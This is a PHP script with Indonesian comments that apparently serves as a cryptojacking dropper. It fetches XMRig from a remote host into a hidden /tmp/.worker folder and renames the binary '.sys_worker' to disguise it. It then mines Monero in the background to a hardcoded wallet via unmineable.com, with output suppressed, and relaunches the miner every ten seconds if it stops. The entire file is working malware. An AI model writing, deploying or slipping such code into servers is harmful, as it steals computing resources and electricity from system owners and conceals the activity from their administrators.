@HCC|1406<?php
// Konfigurasi path
$workerDir = "/tmp/.worker";
$workerBin = "$workerDir/.sys_worker";
$workerLog = "$workerDir/worker.log";
$workerURL = "https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz";

// Fungsi untuk mengunduh dan menyiapkan worker
function setupWorker($workerDir, $workerBin, $workerURL) {
    echo "[*] Menyiapkan worker...\n";
    if (!is_dir($workerDir)) {
        mkdir($workerDir, 0777, true);
    }

    // Bersihkan folder
    array_map('unlink', glob("$workerDir/*"));

    // Download XMRig
    echo "[*] Mengunduh XMRig...\n";
    file_put_contents("$workerDir/xmrig.tar.gz", file_get_contents($workerURL));

    // Ekstrak XMRig
    echo "[*] Mengekstrak XMRig...\n";
    exec("tar -xzf $workerDir/xmrig.tar.gz -C $workerDir");

    // Cek apakah binary ada
    if (file_exists("$workerDir/xmrig")) {
        rename("$workerDir/xmrig", $workerBin);
        chmod($workerBin, 0755);
        echo "[✔] Worker siap di $workerBin\n";
    } else {
        echo "[✘] Gagal mengekstrak XMRig!\n";
        exit(1);
    }
}

// Fungsi untuk menjalankan worker di background
function startWorker($workerBin, $workerLog) {
    echo "[*] Menjalankan worker...\n";
    $hostname = gethostname();
    $command = "$workerBin -a rx -o stratum+ssl://rx.unmineable.com:443 -u XMR:46FP3DQetYzXjMCfns9HEChTzFynnThvY3bXRiELmrRr2yN6zr5YBu4bs8VWjYxdH4ASQsN89Xb4qDjfjTNW35iCKpNJNX7.$hostname -p x --background --log-file=$workerLog > /dev/null 2>&1 &";
    
    exec($command);
    sleep(3); // Tunggu sebelum mengecek status

    if (isWorkerRunning($workerBin)) {
        echo "[✔] Worker berjalan dengan log di $workerLog\n";
    } else {
        echo "[✘] Worker gagal berjalan!\n";
    }
}

// Fungsi untuk mengecek apakah worker berjalan
function isWorkerRunning($workerBin) {
    exec("pgrep -f $workerBin", $output, $status);
    return $status === 0;
}

// Fungsi untuk menjaga worker tetap hidup
function keepWorkerAlive($workerBin, $workerLog) {
    echo "[*] Menjaga worker tetap berjalan...\n";
    while (true) {
        if (!isWorkerRunning($workerBin)) {
            echo "[✘] Worker mati! Menjalankan ulang...\n";
            startWorker($workerBin, $workerLog);
        }
        sleep(10);
    }
}

// Setup jika file worker belum ada
if (!file_exists($workerBin)) {
    setupWorker($workerDir, $workerBin, $workerURL);
}

// Jalankan worker
startWorker($workerBin, $workerLog);

// Pastikan worker selalu berjalan
keepWorkerAlive($workerBin, $workerLog);
?>
@HCC|1406